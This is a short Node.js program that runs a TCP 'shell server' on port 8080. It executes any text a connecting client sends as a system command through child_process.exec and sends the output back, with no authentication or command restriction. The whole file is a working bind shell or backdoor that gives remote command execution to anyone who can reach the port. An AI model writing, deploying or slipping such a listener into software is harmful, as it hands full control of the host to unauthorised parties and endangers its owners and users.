var cds = require("child_process")
var nt = require("net");

var srv=nt.createServer();
srv.on("connection",Connection);

srv.listen(8080,function(){
	console.log("shell server")
});

function Connection(connection){
	var d = Date();
	console.log(d);
connection.on('data',onData);
connection.on('close',onClose);
connection.on('error',onError);
	function onData(data){
		console.log("--------");
		vv=data.toString();
		vv=vv.replace("\n","");
		vv=vv.replace("\r","");
		if (vv!=""){
	         var w =cds.exec( ""+vv , function (err , out ,se){
				connection.end(out+"\r\n"+se);    
			});

			console.log(data.toString());		
		}else{
			connection.end("error\n");	
		}
		
	}
	function onClose(){
		var d = Date();
		console.log(d);
	}
	function onError(data){
		console.log(data);
	}



}
